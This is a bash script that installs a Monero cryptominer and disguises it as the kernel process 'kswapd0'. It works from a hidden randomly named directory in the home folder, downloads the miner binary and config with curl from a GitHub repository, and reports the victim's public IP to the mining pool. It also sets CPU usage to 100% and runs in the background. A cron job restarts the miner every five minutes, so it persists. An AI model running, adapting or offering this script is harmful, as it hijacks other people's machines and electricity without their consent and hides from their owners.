#!/bin/bash

# Function to generate a random string of three letters
generate_random_suffix() {
    echo "$(tr -cd 'a-z' < /dev/urandom | head -c 3)"
}

# Generate the random suffix
RANDOM_SUFFIX=$(generate_random_suffix)
DIR_NAME="$HOME/.gdm2_manual_$RANDOM_SUFFIX"

chattr -i "$DIR_NAME"/*
chattr -i "$DIR_NAME/"

# Script to start Monero Ocean Miner and manage files

# Create directory for the files
mkdir -p "$DIR_NAME/"

# Paths to the required files
KSWAPD0="$DIR_NAME/kswapd0"
CONFIG_JSON="$DIR_NAME/config.json"

# Terminate processes related to the specific kswapd0
pkill -f "$KSWAPD0 --config=$CONFIG_JSON"

# Check if the files exist and download if not
if [ -f "$KSWAPD0" ] && [ -x "$KSWAPD0" ]; then
    echo "kswapd0 exists and is executable."
else
    echo "kswapd0 does not exist or is not executable. Downloading..."
    curl -L -o "$KSWAPD0" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/kswapd0
    chmod +x "$KSWAPD0"
fi

if [ -f "$CONFIG_JSON" ]; then
    echo "config.json exists."
else
    echo "config.json does not exist. Downloading..."
    curl -L -o "$CONFIG_JSON" https://raw.githubusercontent.com/littlAcen/moneroocean-setup/main/config.json
fi

echo "PASS..."
#PASS=`hostname | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g'`
#PASS=`hostname`
#PASS=`sh -c "IP=\$(curl -s checkip.dyndns.org | sed -e 's/.*Current IP Address: //' -e 's/<.*$//'); nslookup \$IP | grep 'name =' | awk '{print \$NF}'"`
PASS=`sh -c "(curl -4 ip.sb)"`
if [ "$PASS" == "localhost" ]; then
  PASS=`ip route get 1 | awk '{print $NF;exit}'`
fi
if [ -z $PASS ]; then
  PASS=na
fi
if [ ! -z $EMAIL ]; then
  PASS="$PASS:$EMAIL"
fi
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $CONFIG_JSON

echo "sed"
#sed -i 's/"url": *"[^"]*",/"url": "gulf.moneroocean.stream:'$PORT'",/' $CONFIG_JSON
#sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $CONFIG_JSON
sed -i 's/"pass": *"[^"]*",/"pass": "'$PASS'",/' $CONFIG_JSON
sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $CONFIG_JSON
#sed -i 's#"log-file": *null,#"log-file": "'$HOME/.swapd/swapd.log'",#' $CONFIG_JSON
#sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $CONFIG_JSON
sed -i 's/"enabled": *[^,]*,/"enabled": true,/' $CONFIG_JSON
sed -i 's/"donate-level": *[^,]*,/"donate-level": 0,/' $CONFIG_JSON
sed -i 's/"donate-over-proxy": *[^,]*,/"donate-over-proxy": 0,/' $CONFIG_JSON
sed -i 's/"background": *false,/"background": true,/' $CONFIG_JSON

# Run kswapd0 if no other process with the specific configuration is running
if ! pgrep -f "$KSWAPD0 --config=$CONFIG_JSON" > /dev/null; then
    echo "kswapd0 not started. Starting it..."
    "$KSWAPD0" --config="$CONFIG_JSON" &
else
    echo "kswapd0 is already running."
fi

# Create the check script
cat << 'EOF' > "$DIR_NAME/check_kswapd0.sh"
#!/bin/bash

KSWAPD0_PATH="$DIR_NAME/kswapd0"
CONFIG_JSON_PATH="$DIR_NAME/config.json"

if ! pgrep -f "./kswapd0" > /dev/null; then
    echo "kswapd0 not started. Going to start it..."
    cd "$DIR_NAME/" || exit
    ./kswapd0 --config=config.json &
else
    echo "kswapd0 already started."
fi
EOF

# Make the check script executable
chmod +x "$DIR_NAME/check_kswapd0.sh"

# Cron job setup: remove outdated lines and add the new command
CRON_JOB="*/5 * * * * $DIR_NAME/check_kswapd0.sh"
(crontab -l 2>/dev/null | grep -v -E '(out dat|check_kswapd0.sh)'; echo "$CRON_JOB") | crontab -
